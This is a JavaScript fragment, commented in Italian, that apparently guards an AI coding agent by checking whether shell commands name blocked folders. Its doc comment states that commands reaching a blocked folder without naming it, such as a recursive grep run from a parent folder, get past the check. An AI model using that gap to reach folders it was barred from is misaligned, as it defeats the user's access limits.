  const linux = /^\/mnt\/[A-Za-z](\/|$)/u.test(grezzo);
  let assoluto;
  if (linux || isAbsolute(grezzo)) assoluto = linux ? grezzo : risolvi(grezzo);
  else if (typeof cartella === 'string' && cartella !== '') assoluto = risolvi(cartella, grezzo);
  else return { radice: radici[0], irrisolvibile: true };
  const perNome = radici.find((r) => dentroOUguale(assoluto, r));
  if (perNome) return { radice: perNome };
  if (linux) return null; // a parole soltanto, come la casa Linux fa per la rete
  let vero;
  try { vero = percorsoRealeAncheSeManca(assoluto, realpathFn); } catch { return { radice: radici[0], irrisolvibile: true }; }
  const perVero = radici.find((r) => dentroOUguale(vero, r));
  return perVero ? { radice: perVero } : null;
}

/**
 * La cartella bloccata che un comando di shell NOMINA (`{ radice }`), o `null`. ⛔ È un innesco, non un confinamento: un comando che ci
 * arriva senza nominarla (`grep -r` da una cartella sopra, uno script che apre i file da sé) non si ferma — Claude Code ha lo stesso
 * limite e lo dice («they don't apply to … arbitrary subprocesses»); la cura sarebbe una sandbox. La frase per la persona lo dichiara.
 */
export function comandoNominaUnaBloccata(comando, { cartella, bloccati, realpathFn = realpathSyncNativa } = {}) {
  if (!Array.isArray(bloccati) || !bloccati.some((b) => typeof b === 'string' && b !== '')) return null;
  for (const pezzo of pezziDelComando(comando)) {
    if (pezzo.startsWith('-') && !pezzo.includes('=')) continue;
    if (!/[\\/.]|^[A-Za-z]:/u.test(pezzo) && !(typeof cartella === 'string' && esisteSync(risolvi(cartella, pezzo)))) continue;
    const esito = bloccataDa(pezzo, { cartella, bloccati, realpathFn });
    if (esito && !esito.irrisolvibile) return { radice: esito.radice };
  }
  return null;
}
